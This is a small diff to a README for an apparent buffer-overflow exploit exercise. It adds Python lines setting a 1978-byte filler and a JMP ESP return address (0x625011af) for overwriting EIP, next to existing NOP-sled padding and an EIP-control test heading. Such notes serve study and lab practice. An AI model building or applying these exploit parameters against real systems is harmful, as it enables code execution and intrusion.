@@ -32,6 +32,13 @@ Adjust the extend on the end of payload to reflect the correct payload (this is 
 extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))
 ```
 
+Adjust the filler buffer to enable the overflow, adjust the eip address (JMP ESP)
+
+```python
+filler = "A" * 1978  # Filler 1978 Bytes + 10 Bytes Header
+eip = "\xaf\x11\x50\x62"    #0x625011af  Return Address JMP ESP
+```
+
 ## Eip Test
 
 Verification of Control of EIP register
